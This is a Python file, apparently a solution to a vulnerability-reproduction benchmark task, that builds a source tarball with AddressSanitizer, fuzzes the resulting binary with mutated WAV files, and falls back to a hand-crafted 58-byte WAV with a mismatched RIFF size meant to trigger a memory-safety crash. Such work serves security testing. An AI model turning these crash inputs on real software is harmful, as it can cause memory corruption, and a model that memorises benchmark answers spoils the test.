import os
import sys
import subprocess
import tempfile
import shutil
import random
import struct
import time
from concurrent.futures import ThreadPoolExecutor

class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp()
        try:
            # Extract source
            subprocess.run(['tar', 'xf', src_path, '-C', work_dir], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
            
            src_root = work_dir
            for root, dirs, files in os.walk(work_dir):
                if 'configure' in files or 'CMakeLists.txt' in files:
                    src_root = root
                    break
            
            # Setup environment for ASAN
            env = os.environ.copy()
            flags = "-fsanitize=address,undefined -g"
            env['CFLAGS'] = flags
            env['CXXFLAGS'] = flags
            env['LDFLAGS'] = "-fsanitize=address,undefined"
            
            # Build
            built = False
            if os.path.exists(os.path.join(src_root, 'configure')):
                subprocess.run(['./configure', '--disable-shared'], cwd=src_root, env=env, 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                subprocess.run(['make', '-j8'], cwd=src_root, env=env, 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                built = True
            elif os.path.exists(os.path.join(src_root, 'CMakeLists.txt')):
                bdir = os.path.join(src_root, 'build_fuzz')
                os.makedirs(bdir, exist_ok=True)
                subprocess.run(['cmake', '..'], cwd=bdir, env=env, 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                subprocess.run(['make', '-j8'], cwd=bdir, env=env, 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                built = True
            elif os.path.exists(os.path.join(src_root, 'Makefile')):
                subprocess.run(['make', '-j8'], cwd=src_root, env=env, 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                built = True
                
            # Find Executable
            candidates = []
            for root, dirs, files in os.walk(work_dir):
                for f in files:
                    path = os.path.join(root, f)
                    if os.access(path, os.X_OK) and not os.path.isdir(path):
                        try:
                            with open(path, 'rb') as tf:
                                if tf.read(4).startswith(b'\x7fELF'):
                                    candidates.append(path)
                        except: pass
            
            # Prioritize candidates
            def score(p):
                n = os.path.basename(p)
                s = 0
                if 'info' in n: s+=10
                if 'convert' in n: s+=5
                if 'dec' in n: s+=5
                if '.so' in n: s-=10
                return s
            candidates.sort(key=score, reverse=True)
            
            target_bin = None
            base_wav = self._get_base_wav()
            
            # Verify candidate
            for cand in candidates:
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as tf:
                        tf.write(base_wav)
                        fn = tf.name
                    
                    env_test = env.copy()
                    env_test['ASAN_OPTIONS'] = "exitcode=88"
                    p = subprocess.run([cand, fn], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, 
                                     env=env_test, timeout=2)
                    os.unlink(fn)
                    
                    # Valid input should not crash (return 0 or 1 usually, not 88 or sigsegv)
                    if p.returncode != 88 and b"AddressSanitizer" not in p.stderr:
                        target_bin = cand
                        break
                except: continue
                
            if not target_bin:
                # If no binary found, use heuristic
                if candidates: target_bin = candidates[0]
                else: return self._heuristic_poc()
                
            # Fuzz
            corpus = [base_wav]
            # Add specific seeds based on vulnerability description
            # 1. RIFF size mismatch (claim small size, but file is normal/larger)
            s1 = bytearray(base_wav)
            struct.pack_into('<I', s1, 4, 4)
            corpus.append(bytes(s1))
            # 2. Huge chunk size
            s2 = bytearray(base_wav)
            struct.pack_into('<I', s2, 16, 0x7FFFFFFF)
            corpus.append(bytes(s2))
            
            start_time = time.time()
            found_poc = None
            
            def fuzz(data):
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as tf:
                        tf.write(data)
                        fn = tf.name
                    e = os.environ.copy()
                    e['ASAN_OPTIONS'] = "exitcode=88:halt_on_error=1"
                    p = subprocess.run([target_bin, fn], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, 
                                     env=e, timeout=0.5)
                    os.unlink(fn)
                    if p.returncode == 88 or b"AddressSanitizer" in p.stderr:
                        return data
                except: pass
                return None

            with ThreadPoolExecutor(max_workers=8) as exe:
                while time.time() - start_time < 50:
                    futures = []
                    # Try existing corpus first
                    if time.time() - start_time < 5:
                         for c in corpus:
                            futures.append(exe.submit(fuzz, c))
                    
                    # Generate mutations
                    for _ in range(40):
                        seed = random.choice(corpus)
                        mut = self._mutate(seed)
                        futures.append(exe.submit(fuzz, mut))
                            
                    for f in futures:
                        res = f.result()
                        if res:
                            return res
            
            return self._heuristic_poc()
            
        except:
            return self._heuristic_poc()
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    def _get_base_wav(self):
        # 44 bytes valid WAV
        return (b'RIFF' + struct.pack('<I', 36) + b'WAVE' + 
                b'fmt ' + struct.pack('<I', 16) + 
                struct.pack('<HHIIHH', 1, 1, 44100, 88200, 2, 16) + 
                b'data' + struct.pack('<I', 0))

    def _mutate(self, data):
        data = bytearray(data)
        if not data: return bytes()
        m = random.randint(0, 10)
        
        if m < 3: # Flip
            i = random.randint(0, len(data)-1)
            data[i] ^= random.randint(1, 255)
        elif m < 6: # Int32
            if len(data) >= 4:
                i = random.randint(0, len(data)-4)
                v = random.choice([0, 0xFFFFFFFF, 0x7FFFFFFF, 0x80000000, len(data), len(data)-4])
                struct.pack_into('<I', data, i, v)
        elif m < 8: # Offsets specific to WAV
            if len(data) > 8: 
                # Manipulate RIFF size
                struct.pack_into('<I', data, 4, random.choice([4, len(data), 0xFFFFFFFF]))
            if len(data) > 20: 
                # Manipulate fmt size
                struct.pack_into('<I', data, 16, random.choice([0xFFFFFFFF, 1000, 20]))
        elif m == 8: # Trim
            if len(data) > 12: data = data[:random.randint(12, len(data))]
        else: # Append
            data += os.urandom(random.randint(1, 20))
        return bytes(data)

    def _heuristic_poc(self):
        # Fallback PoC based on description and length target (58 bytes)
        # Vulnerability: data size not checked against RIFF end.
        b = bytearray(self._get_base_wav()) # 44 bytes
        b += b'\x00' * 14 # 58 bytes
        # Set RIFF size to 4 (header only), while file is 58 bytes
        struct.pack_into('<I', b, 4, 4)
        # Set fmt chunk size to very large
        struct.pack_into('<I', b, 16, 0x0FFFFFFF)
        return bytes(b)
